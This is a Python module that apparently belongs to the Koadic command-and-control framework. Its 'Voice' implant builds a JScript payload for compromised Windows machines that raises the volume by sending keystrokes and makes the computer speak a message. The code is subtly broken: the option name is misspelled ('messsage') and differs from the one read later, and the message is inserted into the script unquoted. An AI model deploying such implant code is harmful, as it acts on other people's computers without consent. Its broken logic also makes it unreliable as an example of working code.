import core.job
import core.implant
import uuid

class VoiceJob(core.job.Job):
    def done(self):
        self.display()

    def display(self):
        self.shell.print_plain(self.data)

class VoiceImplant(core.implant.Implant):

    NAME = "Voice"
    DESCRIPTION = "Makes the computer speak a message."
    AUTHORS = ["RiskSense, Inc."]

    def load(self):
        self.options.register("messsage", "I can't ddo that Dave", "message to speak")

    def run(self):

        try:
            with open("data/implant/fun/voice.js", "w") as file: 
                voice = "try {var voiceObj = new ActiveXObject('sapi.spvoice'); for (var i = 0; i < 50; ++i) {Koadic.WS.SendKeys(String.fromCharCode(0xAF)); } voiceObj.Speak("+self.options.get('message')+");Koadic.work.report(''); } catch (e) {Koadic.work.error(e) } Koadic.exit();"
                file.write(voice)
                file.close()
        except IOError as e:
            raise e

        payloads = {}
        #payloads["vbs"] = self.load_script("data/implant/fun/voice.vbs", self.options)
        payloads["js"] = self.loader.load_script("data/implant/fun/voice.js", self.options)

        self.dispatch(payloads, VoiceJob)
